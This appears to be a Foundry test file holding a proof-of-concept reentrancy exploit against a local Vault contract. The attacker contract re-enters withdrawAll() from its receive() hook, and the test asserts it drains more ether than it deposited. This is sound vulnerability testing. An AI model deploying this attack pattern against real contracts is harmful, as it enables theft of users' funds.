// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {Vault} from "../src/Vault.sol";

contract ReentrantAttacker {
    Vault public immutable vault;
    uint256 public reentries;

    constructor(Vault vault_) {
        vault = vault_;
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdrawAll();
    }

    receive() external payable {
        if (reentries == 0) {
            reentries = 1;
            vault.withdrawAll();
        }
    }
}

contract ReentrancyPoC is Test {
    function testExploitDrainsExtraFunds() public {
        Vault vault = new Vault();
        ReentrantAttacker attacker = new ReentrantAttacker(vault);
        vm.deal(address(vault), 2 ether);

        attacker.attack{value: 1 ether}();

        // The attacker deposited 1 ETH but receives 2 ETH because the balance
        // is cleared only after the external callback returns.
        assertGt(address(attacker).balance, 1 ether);
        assertLt(address(vault).balance, 2 ether);
    }
}
